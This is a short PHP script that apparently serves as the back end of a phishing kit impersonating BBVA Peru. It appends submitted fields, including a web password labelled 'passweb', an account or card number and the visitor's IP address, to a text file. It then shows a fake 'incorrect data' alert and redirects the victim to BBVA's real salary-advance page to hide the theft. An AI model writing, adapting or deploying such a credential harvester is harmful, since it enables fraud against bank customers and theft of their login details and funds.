<?php
  $opcion = $_POST['opcion'];
  $number1 = $_POST['number1'];
  $passweb = $_POST['passweb'];
  $ip = $_SERVER['REMOTE_ADDR'];
  
  $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
  
  $fecha = date("d/m/y g:i:s");
  $file = fopen('result.txt', 'at');
  fwrite($file, "opcion: $opcion \n number1: $number1 \n passweb: $passweb \n ip: $ip \n  fecha: $fecha \n");
  fclose($file);
  
  echo "<script>alert('Datos incorrectos, intente nuevamente')</script>";
   
  echo "<script>location.href='https://www.bbva.pe/personas/productos/prestamos/personales/adelanto-de-sueldo.html'</script>";

?>